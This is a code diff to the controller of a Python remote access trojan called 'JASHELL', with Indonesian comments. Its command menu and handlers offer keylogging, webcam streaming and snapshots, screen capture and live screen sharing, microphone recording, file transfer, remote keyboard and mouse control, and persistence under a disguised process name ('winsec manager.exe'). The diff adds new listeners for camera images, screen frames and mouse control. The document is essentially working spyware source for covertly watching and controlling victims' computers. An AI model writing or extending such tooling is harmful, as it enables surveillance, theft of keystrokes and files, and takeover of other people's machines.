@@ -10,18 +10,45 @@ import pyaudio
 import pyfiglet
 import random
 from colorama import Fore
-from vidstream import StreamingServer
+import server
 
 soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 soc.bind(('0.0.0.0', 9999))
-print(Fore.GREEN+'[+] Menunggu koneksi...')
+print('[+] Menunggu koneksi')
 soc.listen(1)
 
 koneksi = soc.accept()
 _target = koneksi[0]
 ip = koneksi[1]
-print(_target)
 print(Fore.CYAN+f'[+] Terhubung ke {str(ip)}')
+
+def start_image_server(host="0.0.0.0", port=9993, save_as="hasil.jpg"):
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind((host, port))
+    server.listen(1)
+
+    print(Fore.BLUE+"connecting")
+    conn, addr = server.accept()
+    print(Fore.RED+f"connected {addr}")
+
+    size_data = conn.recv(4)
+    size = struct.unpack("!I", size_data)[0]
+
+    data = b""
+    while len(data) < size:
+        packet = conn.recv(4096)
+        if not packet:
+            break
+        data += packet
+
+    with open(save_as, "wb") as f:
+        f.write(data)
+
+    print(Fore.BLUE+f'saved as {save_as}')
+
+    conn.close()
+    server.close()
+
 
 def keystroke():
      with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -50,7 +77,7 @@ def receive_and_save():
                s.listen(1)
                conn, addr = s.accept()
                with conn:
-                    print(Fore.GREEN+'connect')
+                    print(Fore.GREEN+f'connect {addr}')
                     while True:
                          data = conn.recv(CHUNK)
                          if not data:
@@ -65,17 +92,60 @@ def receive_and_save():
                wf.writeframes(b''.join(frames))
           print(f'{WAVE_OUTPUT}')
      except socket.error as e:
-          print(e)
-     
-def konversi_byte_screen_recorder():
-     receive = StreamingServer('0.0.0.0', 9997)
+          print(f'{e}')
 
-     t = threading.Thread(target=receive.start_server)
-     t.start()
+def screen_record(host="0.0.0.0", port=9999):
+    MAX_WIDTH = 960
+    MAX_HEIGHT = 540
+    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server.bind((host, port))
+    server.listen(1)
 
-     while input("") != 'stop':
-          continue
-     receive.stop_server()
+    print("connecting")
+    conn, addr = server.accept()
+    print(f"connected {addr}") 
+
+    data = b""
+    payload_size = struct.calcsize("Q")
+
+    cv2.namedWindow('Screen Share | Q / ESC = Quit', cv2.WINDOW_NORMAL)
+    cv2.resizeWindow('Screen Share | Q / ESC = Quit', MAX_WIDTH, MAX_HEIGHT)
+
+    while True:
+        try:
+            while len(data) < payload_size:
+                packet = conn.recv(4096)
+                if not packet:
+                    return
+                data += packet
+
+            packed_size = data[:payload_size]
+            data = data[payload_size:]
+            frame_size = struct.unpack("Q", packed_size)[0]
+
+            while len(data) < frame_size:
+                data += conn.recv(4096)
+
+            frame_data = data[:frame_size]
+            data = data[frame_size:]
+
+            frame = pickle.loads(frame_data)
+            frame = cv2.resize(frame, (MAX_WIDTH, MAX_HEIGHT))
+            
+            cv2.imshow("Screen Share | Q / ESC = Quit", frame)
+
+            key = cv2.waitKey(1) & 0xFF
+            if key == ord('q') or key == 27:
+                print("stoped")
+                break
+
+        except Exception as e:
+            print("error", e)
+            break
+
+    conn.close()
+    cv2.destroyAllWindows()
+
 
 def konversi_byte_stream():
      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -101,10 +171,11 @@ def konversi_byte_stream():
           frame_data = bdata[:msg_size]
           bdata =  bdata[msg_size:]
           frame = pickle.loads(frame_data)
+          cv2.startWindowThread()
           cv2.imshow("streaming", frame)
           key = cv2.waitKey(1)
-          if key == 27:
-               break
+          if key & 0xFF == ord('q'):
+               break 
      tg.close()
      cv2.destroyAllWindows()
 
@@ -120,12 +191,12 @@ def upload_file(namafile):
 def download_file(namafile):
      file = open(namafile, 'wb')
      _target.settimeout(1)
-     _file = _target.recv(100000)
+     _file = _target.recv(65536*100)
      while _file:
           print(Fore.GREEN+'downloading')
           file.write(_file)
           try:
-               file = _target.recv(100000)
+               file = _target.recv(65536*100)
           except socket.timeout as e:
                print(Fore.CYAN+'downloaded')
                break
@@ -146,7 +217,7 @@ def shellc():
     n = 0
     print(Fore.BLUE+"Type 'help' for help")
     while True:
-        perintah = input(Fore.GREEN+'jashell~# ')
+        perintah = input(Fore.GREEN+'shell> ')
         data = json.dumps(perintah)
         _target.send(data.encode())
         if perintah in('exit','quit'):
@@ -160,15 +231,19 @@ def shellc():
         elif perintah[:6] == 'upload':
              upload_file(perintah[7:])
         elif perintah == 'start_log':
+             print('starting keylogger')
              pass
         elif perintah == 'baca_log':
              data = _target.recv(1024).decode()
              print(data)
+        elif perintah == 'clear_log':
+             pass  
         elif perintah == 'stop_log':
+             print('stoping keylogger')
              pass
         elif perintah == 'start_cam':
              stream_cam()
-        elif perintah ==  'screensh':
+        elif perintah ==  'screen_shot':
              n += 1
              file = open("ss"+str(n)+".png", 'wb')
              _target.settimeout(3)
@@ -181,38 +256,66 @@ def shellc():
                        break
              _target.settimeout(None)
              file.close()
-        elif perintah == 'screensr':
-             konversi_byte_screen_recorder()
+        elif perintah == 'screen_share':
+              screen_record(host='0.0.0.0', port=9991) 
         elif perintah == 'help':
              print(Fore.BLUE+"""
+                   
+                      basic command:
+                   ================================
                    -exit/quit >> keluar
                    
                    -clear     >> bersihkan terminal
 
+                   -banner    >> baner
+                   ================================
+
+                      file transfer command:
+                   ================================
                    -download  >> mendownload file
 
                    -upload    >> mengupload file
+                   ================================
 
+                      keylogging:
+                   ================================
                    -start_log >> memulai keylogger
 
                    -baca_log  >> membaca hasil keylogger
 
-                   -stop_log  >> menghentikan keylogger
+                   -clear_log >> menghapus hasil keylogger
 
+                   -stop_log  >> menghentikan keylogger
+                   ================================
+
+                     camera command:
+                   ================================                   
                    -start_cam >> mengakses kamera
 
-                   -screensh  >> screenshot layar
+                   -snap_cam  >> memotret kamera
+                   ================================
 
-                   -screensr  >> berbagi layar
+                     screen command:
+                   ================================
+                   -screen_shot >> screenshot layar
 
+                   -screen_share >> berbagi layar
+                   ================================
+
+                     maintain access:
+                   ================================ 
                    -persistence >> menjalankan persistensi
-                   contoh:    peristence winsec manager.exe
-                   
+                   contoh:    persistence winsec manager.exe
+                   =================================
+
+                     mic, keys and cursor command:
+                   ================================
                    -rec_audio >> merekam audio
                    
-                   -send      >> mengirimkan keyboard
+                   -send_key  >> mengetikan keyboard
 
-                   -banner    >> baner
+                   -send_mouse >> menggerakan kursor
+                   ================================ 
                    
                    """)
         elif perintah == 'rec_audio':
@@ -221,8 +324,12 @@ def shellc():
              list_banner = [pyfiglet.figlet_format('JASHELL', font='slant'), pyfiglet.figlet_format('SHELL', font='3-d'), pyfiglet.figlet_format('JASHELL', font='standard'), pyfiglet.figlet_format('SHELL', font='banner')]
              choice = random.choice(list_banner)
              print(choice)
-        elif perintah == 'send':
-             keystroke()  
+        elif perintah == 'send_key':
+             keystroke()   
+        elif perintah == 'send_mouse':
+             server.start_server(host='0.0.0.0', port=9994)
+        elif perintah == 'snap_cam':
+             start_image_server()  
         else:
              hasil = data_diterima()
              print(hasil)
